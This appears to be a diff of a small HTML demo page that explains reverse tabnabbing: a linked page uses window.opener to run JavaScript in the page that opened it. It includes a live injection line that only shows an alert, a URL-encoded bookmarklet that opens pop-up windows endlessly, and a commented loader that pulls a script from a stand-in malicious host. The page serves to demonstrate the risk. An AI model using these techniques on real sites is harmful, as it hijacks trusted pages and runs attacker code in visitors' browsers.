@@ -1,6 +1,16 @@
-<h1>Joe Mama's Blog</h1>
-<h2>Hi welcome to Joe Mama's blog. Just kidding, you've been XSS'd!</h2>
-<h3>get xss'd</h3>
+<h1>XSS website</h1>
+<h2>This website could look entirely normal, but with a single line of JavaScript code, it can corrupt any webpage that linked to it.</h2>
+<h3><code>window.opener.location.href</code> does have a few uses, but generally it's only used for malicious purposes. However, not much can be done with it, as all it does is change the URL of the original page. However, bookmarklets are JavaScript codes linked to URLs and we <i>can</i> run JS urls to the original page.</h3>
+<h3>It can also be used to run untrusted code on a trusted website. For example, this code <code>javascript:(function()%7Bvar i %3D 2%3Bwhile (i <%3D 10) %7Bwindow.open("about:blank#gotcha"%2C""%2C"width%3D1200%2Cheight%3D600"%2C)%3Bi%20-%3D%202%3B%7D%7D)()</code> spams pop-ups, but almost all pop-up blockers stop it from doing so. If you trusted a totally innocent site with popups, but that totally innocent site was hijacked by this one, then this code would pass through the pop-up blocker.</h3>
 <script>
-window.opener.location.href="javascript:alert('wtf dad...')"
+/*This single line of code can inject JS code into a page. You can also set it up to run code from a link, so it's not inline.
+javascript(function(){
+	var%20script=document.createElement('script');
+	script.type='text/javascript';
+	script.src='http://maliciouswebsite.com/script.js';
+	document.getElementsByTagName('head')[0].appendChild(script);
+})();
+(of course all in one line.)
+*/
+window.opener.location.href="javascript:alert('This is code injected solely by the malicious link.')"
 </script>
